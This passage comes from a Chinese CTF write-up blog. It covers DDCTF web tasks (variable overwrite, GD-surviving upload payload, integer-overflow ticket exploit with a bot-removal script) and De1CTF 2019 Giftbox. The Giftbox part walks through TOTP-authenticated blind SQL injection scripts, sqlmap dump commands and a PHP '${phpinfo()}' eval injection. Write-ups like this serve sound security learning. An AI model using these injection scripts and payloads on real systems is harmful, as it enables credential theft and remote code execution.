<span class="keyword">echo</span><span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>一个简单的变量覆盖问题了<br>构造 Payload</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">plaintext</div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://117.51.150.246/f1ag!ddctf.php?k=1&amp;uid=</span><br></pre></td></tr></table></figure></div>
<p>得到flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g26r9dzv65j30e9028q38.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g26r9dzv65j30e9028q38.jpg" class="lazyload"></a></p>
<hr>
<h2 id="Web-03-Upload-IMG"><a href="#Web-03-Upload-IMG" class="headerlink" title="Web-03 Upload-IMG"></a>Web-03 Upload-IMG</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26rm125r3j30bu043jrh.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26rm125r3j30bu043jrh.jpg" class="lazyload"></a></p>
<p>先随便上传一张图试一下，发现回显</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26rm1auqbj30h604lgma.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26rm1auqbj30h604lgma.jpg" class="lazyload"></a></p>
<p>要求 <code>phpinfo()</code> ,在加马上去后，发现回显仍然存在，看样子是二次渲染;<br>发现开头是 php-gd 会带着 gbjpeg 转换。<br>然后就用winhex 传图、加马、把图下下来，对比，看哪里的源码没变<br>然后就是fuzz 添加 <code>phpinfo()</code> 九个字符</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruusamj30mt04iq3c.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruusamj30mt04iq3c.jpg" class="lazyload"></a></p>
<p>然后就得到flag了</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruut21j30k804kt8y.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruut21j30k804kt8y.jpg" class="lazyload"></a></p>
<hr>
<h2 id="Web-06-大吉大利，今晚吃鸡"><a href="#Web-06-大吉大利，今晚吃鸡" class="headerlink" title="Web-06 大吉大利，今晚吃鸡~"></a>Web-06 大吉大利，今晚吃鸡~</h2><p>这个题做的时候说实话一开始挺懵的<br>注册后发现钱不够买票，尝试改价格， 0，1，100，-2000 等等<br>懵了很久后，问了同学，得到tips，是溢出 ORZ… 行吧<br>把2000 改成 2^32<br>就是：4294967296</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruxpusj30zd0mj0zx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruxpusj30zd0mj0zx.jpg" class="lazyload"></a></p>
<p>然后实现免费购票</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruvq42j30o90a274z.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g26qruvq42j30o90a274z.jpg" class="lazyload"></a></p>
<p>然后就是干掉这些脚本吃鸡<br>思路就是注册小号然后移除小号<br>后面就拜托大佬帮忙写脚本(真的要去看Python了啊啊啊啊)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">main_session = requests.session()</span><br><span class="line"></span><br><span class="line">main_session.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/login?name=Admin111&amp;password=12345678&quot;</span>)</span><br><span class="line"></span><br><span class="line">mutex = threading.Lock()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove_bot</span>(<span class="params"><span class="built_in">id</span>, ticket</span>):</span><br><span class="line">    <span class="keyword">global</span> main_session</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(main_session.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/get_flag&quot;</span>).json())</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(main_session.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/remove_robot?id=&quot;</span> + <span class="built_in">str</span>(<span class="built_in">id</span>) + <span class="string">&quot;&amp;ticket=&quot;</span> + <span class="built_in">str</span>(ticket)).json())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_bot</span>(<span class="params">index=<span class="number">1</span></span>):</span><br><span class="line">    s = requests.Session()</span><br><span class="line"></span><br><span class="line">    s.get(<span class="string">&#x27;http://117.51.147.155:5050/ctf/api/register?name=robot111&#x27;</span> + <span class="built_in">str</span>(index) + <span class="string">&#x27;&amp;password=12345678&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r = s.get(<span class="string">&#x27;http://117.51.147.155:5050/ctf/api/buy_ticket?ticket_price=4294967296&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r = s.get(<span class="string">&quot;http://117.51.147.155:5050/ctf/api/pay_ticket?bill_id=&quot;</span> + r.json()[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;bill_id&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> r.json()[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;your_id&#x27;</span>], r.json()[<span class="string">&#x27;data&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;your_ticket&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_and_remove</span>(<span class="params">index=<span class="number">1</span></span>):</span><br><span class="line">    info = create_bot(index)</span><br><span class="line">    remove_bot(info[<span class="number">0</span>], info[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">10000</span>):</span><br><span class="line">    pool.submit(create_and_remove, i)</span><br><span class="line"></span><br><span class="line">pool.shutdown(<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>移除完所有敌人后，就可以拿到flag啦</p>
<hr>
<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>看着前面排名无数熟悉的大佬，自己不能只划水不努力啊，最近还是要坚持去花些时间看看书，做做题，也给自己立个flag，五一前去把流量分析好好学一学</p>
]]></content>
      <categories>
        <category>做题笔记</category>
      </categories>
      <tags>
        <tag>writeup</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>De1CTF Giftbox题解</title>
    <url>/yakko117/2020/04/02/De1CTFGiftbox/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>一道可以学习到很多的题目，还是自己太菜了，要看大佬的wp才能完全了解透彻</p>
<h1 id="De1CTF-2019-Giftbox"><a href="#De1CTF-2019-Giftbox" class="headerlink" title="[De1CTF 2019]Giftbox"></a>[De1CTF 2019]Giftbox</h1><p>题目打开，只能感慨大师傅还是大师傅，题目前端做成这个效果，太顶了</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_1.png" data-fancybox="group" data-caption="gift1" class="fancybox"><img alt="gift1" title="gift1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_1.png" class="lazyload"></a></p>
<p>看样子是个 <code>linux终端</code>, 然后看一下有哪些命令可以调用</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_2.png" data-fancybox="group" data-caption="gift2" class="fancybox"><img alt="gift2" title="gift2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_2.png" class="lazyload"></a></p>
<p>试一下相应的命令，看一下效果</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_3.png" data-fancybox="group" data-caption="gift3" class="fancybox"><img alt="gift3" title="gift3" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_3.png" class="lazyload"></a></p>
<p>看到了 <code>usage.md</code> 有新的 <code>hint</code>，尝试一下</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_4.png" data-fancybox="group" data-caption="gift4" class="fancybox"><img alt="gift4" title="gift4" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_4.png" class="lazyload"></a></p>
<p>可以看到，都需要先登陆，那就尝试一下 <code>sql注入</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[de1ta<span class="variable">@de1ta</span><span class="operator">-</span>mbp <span class="operator">/</span>sandbox]<span class="operator">%</span> login admin<span class="string">&#x27;and/**/&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span> admin</span><br><span class="line">login fail, password incorrect.</span><br><span class="line">[de1ta<span class="variable">@de1ta</span><span class="operator">-</span>mbp <span class="operator">/</span>sandbox]<span class="operator">%</span> login admin<span class="string">&#x27;and/**/&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">0</span> admin</span><br><span class="line">login fail, <span class="keyword">user</span> <span class="keyword">not</span> found.</span><br></pre></td></tr></table></figure></div>

<p>查看数据包，看到有个 **<code>totp</code>**，再次提交之后这个 <strong><code>totp</code></strong> 又会发生改变</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_5.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_5.png" class="lazyload"></a></p>
<hr>
<h2 id="查了一下-TOTP"><a href="#查了一下-TOTP" class="headerlink" title="查了一下 TOTP"></a>查了一下 TOTP</h2><p><a href="https://baike.baidu.com/item/TOTP%E7%AE%97%E6%B3%95/22810708?fr=aladdin">TOTP算法</a> (<code>Time-based One-time Password algorithm</code>)是一种从共享密钥和当前时间计算一次性密码的算法。</p>
<p>**<font color="6495ED">一些要求</font>**：</p>
<ul>
<li>令牌与服务器之间必须时钟同步；</li>
<li>令牌与服务器之间必须共享密钥；</li>
<li>令牌与服务器之间必须使用相同的时间步长</li>
</ul>
<p>**<font color="6495ED">核心算法</font>**：<br><strong><font color="6495ED">TOTP &#x3D;Truncate(HMAC-SHA-1(K, (T - T0) &#x2F; X))</font></strong><br><strong><font color="6495ED">X</font></strong> 是时间间隔</p>
<hr>
<p>然后在 <code>main.js</code> 找到了密钥</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_6.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_6.png" class="lazyload"></a></p>
<p>在这上面的注释里也给出了提示</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div></div><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="title class_">Developer</span> <span class="title class_">Notes</span>]</span><br><span class="line"><span class="variable constant_">OTP</span> <span class="title class_">Library</span> <span class="keyword">for</span> <span class="title class_">Python</span> located <span class="keyword">in</span> js/pyotp.<span class="property">zip</span></span><br><span class="line"><span class="title class_">Server</span> <span class="title class_">Params</span>:</span><br><span class="line">digits = <span class="number">8</span></span><br><span class="line">interval = <span class="number">5</span></span><br><span class="line"><span class="variable language_">window</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure></div>
<p>然后跟进去看 <code>totp.min.js</code> 可以看到最后有新的 <code>hint</code> (虽然作用不大233</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Javascript</div></div><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Two</span>-factor authentication implementation <span class="keyword">in</span> pure javascript.</span><br><span class="line"><span class="title class_">One</span>-time password generator (<span class="variable constant_">HOTP</span>/<span class="variable constant_">TOTP</span>) <span class="keyword">with</span> support <span class="keyword">for</span> <span class="title class_">Google</span> <span class="title class_">Authenticator</span>.</span><br><span class="line">@author   wuyanxin &lt;<span class="attr">https</span>:<span class="comment">//wuyanxin.com&gt;</span></span><br><span class="line">@license  <span class="variable constant_">MIT</span></span><br></pre></td></tr></table></figure></div>

<p>然后在gay吧找到了 <a href="https://github.com/wuyanxin/totp.js">https://github.com/wuyanxin/totp.js</a><br>(算法还是挺好理解的)</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_7.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_7.png" class="lazyload"></a></p>
<p>可以看到缺省值就是5</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_8.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_8.png" class="lazyload"></a></p>
<p>然后看了大佬的写法</p>
<hr>
<h2 id="获取-sql-密码"><a href="#获取-sql-密码" class="headerlink" title="获取 sql 密码"></a>获取 sql 密码</h2><h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>用 <code>flask</code> 搭建一个本地服务并接受参数传到靶机，然后用 <code>sqlmap</code> 去跑本地靶机</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyotp</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line">app=Flask(__name__)</span><br><span class="line">totp=pyotp.TOTP(<span class="string">&#x27;GAXG24JTMZXGKZBU&#x27;</span>,digits=<span class="number">8</span>,interval=<span class="number">5</span>)</span><br><span class="line">s=requests.session()</span><br><span class="line">fuzz=string.printable</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/username=&lt;username&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hack</span>(<span class="params">username</span>):</span><br><span class="line">    url=<span class="string">&#x27;http://link-site/shell.php&#x27;</span></span><br><span class="line">    username=(username).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>)</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&#x27;a&#x27;</span>:<span class="string">&#x27;login &#123;&#125; admin&#x27;</span>.<span class="built_in">format</span>(username),</span><br><span class="line">        <span class="string">&#x27;totp&#x27;</span>:totp.now()</span><br><span class="line">    &#125;</span><br><span class="line">    res = s.get(url,params=params)</span><br><span class="line">    <span class="keyword">return</span> res.content</span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></div>

<p>启动之后 用 <code>sqlmap</code> 去跑</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://127.0.0.1:5000/username=admin*&quot;</span> -D giftbox -T <span class="built_in">users</span> -C password --dump  --technique B</span><br><span class="line"></span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1:5000/username=admin*&quot;</span></span><br></pre></td></tr></table></figure></div>

<p>得到密码: <strong><font color="6495ED">hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</font></strong></p>
<h3 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h3><p>来自<a href="https://www.zhaoj.in/read-6170.html">赵师傅</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># --- coding: utf-8 ---</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> pyotp <span class="keyword">as</span> pyotp</span><br><span class="line"></span><br><span class="line">totp = pyotp.TOTP(<span class="string">&#x27;GAXG24JTMZXGKZBU&#x27;</span>, <span class="number">8</span>, interval=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    get_all_databases()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">http_get</span>(<span class="params">payload</span>):</span><br><span class="line"></span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">    r = requests.post(<span class="string">&#x27;http://link-site/shell.php&#x27;</span>, params=&#123;<span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;login admin\&#x27;/**/and/**/(&#x27;</span> + payload + <span class="string">&#x27;)/**/and/**/\&#x27;1\&#x27;=\&#x27;1 admin&#x27;</span>, <span class="string">&#x27;totp&#x27;</span>: totp.now()&#125;,data=&#123;<span class="string">&#x27;dir&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;pos&#x27;</span>: <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;filename&#x27;</span>: <span class="string">&#x27;usage.md&#x27;</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;login admin\&#x27;/**/and/**/(&#x27;</span> + payload + <span class="string">&#x27;)/**/and/**/\&#x27;1\&#x27;=\&#x27;1 admin&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(r.text)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取数据库</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_all_databases</span>():</span><br><span class="line">    <span class="comment"># db_nums_payload = &quot;select/**/count(*)/**/from/**/users&quot;</span></span><br><span class="line">    <span class="comment"># db_numbers = half(db_nums_payload)</span></span><br><span class="line">    <span class="comment"># print(&quot;长度为：%d&quot; % db_numbers)</span></span><br><span class="line"></span><br><span class="line">    db_payload = <span class="string">&quot;select/**/concat(password)/**/from/**/users&quot;</span></span><br><span class="line">    db_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">64</span>):</span><br><span class="line">        db_name_payload = <span class="string">&quot;ascii(substr((&quot;</span> + db_payload + <span class="string">&quot;),%d,1))&quot;</span> % (y)</span><br><span class="line">        db_name += <span class="built_in">chr</span>(half(db_name_payload))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;值：&quot;</span> + db_name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 二分法函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">half</span>(<span class="params">payload</span>):</span><br><span class="line">    low = <span class="number">0</span></span><br><span class="line">    high = <span class="number">126</span></span><br><span class="line">    <span class="comment"># print(standard_html)</span></span><br><span class="line">    <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">        mid = (low + high) / <span class="number">2</span></span><br><span class="line">        mid_num_payload = <span class="string">&quot;%s/**/&gt;/**/%d&quot;</span> % (payload, mid)</span><br><span class="line">        <span class="comment"># print(mid_num_payload)</span></span><br><span class="line">        <span class="comment"># print(mid_html)</span></span><br><span class="line">        <span class="keyword">if</span> http_get(mid_num_payload):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    mid_num = <span class="built_in">int</span>((low + high + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> mid_num</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>

<p>同样会得到密码: <strong><font color="6495ED">hint{G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333}</font></strong></p>
<hr>
<h2 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% login admin hint&#123;G1ve_u_hi33en_C0mm3nd-sh0w_hiiintttt_23333&#125;</span><br><span class="line">login success.</span><br></pre></td></tr></table></figure></div>

<p>然后试一下 <code>targeting</code> <code>launch</code> <code>destruct</code> 等等命令</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9.png" data-fancybox="group" data-caption="gift5" class="fancybox"><img alt="gift5" title="gift5" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9.png" class="lazyload"></a></p>
<p>以及 <code>hint</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[de1ta@de1ta-mbp /sandbox]% sh0w_hiiintttt_23333</span><br><span class="line">we add an evil monster named <span class="string">&#x27;eval&#x27;</span> when launching missiles.</span><br></pre></td></tr></table></figure></div>

<p>看到 <code>eval</code> 知道考点是RCE代码注入<br>然后网上找到了这个<a href="https://xz.aliyun.com/t/4785">从一道题讲PHP复杂变量</a></p>
<ul>
<li>php会处理双引号里面的东西，所以：</li>
</ul>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;<span class="subst">$a</span>&quot;</span>;  输出abc</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&quot;\$a&quot;</span>; 输出<span class="variable">$a</span></span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;$a&#x27;</span>;  输出<span class="variable">$a</span></span><br></pre></td></tr></table></figure></div>

<ul>
<li>如果 <code>&#123;</code> 和 <code>$</code> 紧挨着也会表示一个变量</li>
</ul>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$great</span> = <span class="string">&#x27;fantastic&#x27;</span>;</span><br><span class="line"></span><br><span class="line">无效，输出: This is &#123; fantastic&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is &#123; <span class="subst">$great</span>&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">有效，输出： This is fantastic</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is <span class="subst">&#123;$great&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;This is $&#123;great&#125;&quot;</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>bypass<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&quot;$&#123;phpinfo()&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">or</span></span><br><span class="line"><span class="variable">$a</span>=$&#123;<span class="title function_ invoke__">phpinfo</span>()&#125;;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<p>照着上面的思路 </p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9_2.png" data-fancybox="group" data-caption="gift9_2" class="fancybox"><img alt="gift9_2" title="gift9_2" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_9_2.png" class="lazyload"></a></p>
<p>将 <code>Error</code> 的 内容保存本地 可以看到就是 <code>phpinfo</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_10.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_10.png" class="lazyload"></a></p>
<p>可以看到 <code>open_basedir</code> 限制了路径<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11.png" class="lazyload"></a></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11_1.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_11_1.png" class="lazyload"></a></p>
<p>然后看一下其他过滤</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12.png" class="lazyload"></a></p>
<p><strong><font color="6495ED">code</font></strong> 长度限制2位</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_2.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_2.png" class="lazyload"></a></p>
<p><strong><font color="6495ED">position</font></strong> 长度限制12位，同样都存在 <code>\</code> 的过滤(其实也简单，用 <code>chr()</code> 绕过)</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_3.png" data-fancybox="group" data-caption="undefined" class="fancybox"><img data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/giftbox_12_3.png" class="lazyload"></a></p>
<p>总结一下运行过程</p>
<ul>
<li><font color="6495ED">targeting code position</font> -&gt; 储存一条 <code>$code = &quot;position&quot;</code>;</li>
<li><font color="6495ED">launch</font> -&gt; 将上面 <code>targeting</code> 的 <code>code</code>  按照字典顺序跑一遍</li>
<li><font color="6495ED">destuct</font> -&gt; 全部清空，恢复初始状态</li>
</ul>
<p>然后按照上面 <a href="https://xz.aliyun.com/t/4720">open_basedir绕过</a></p>
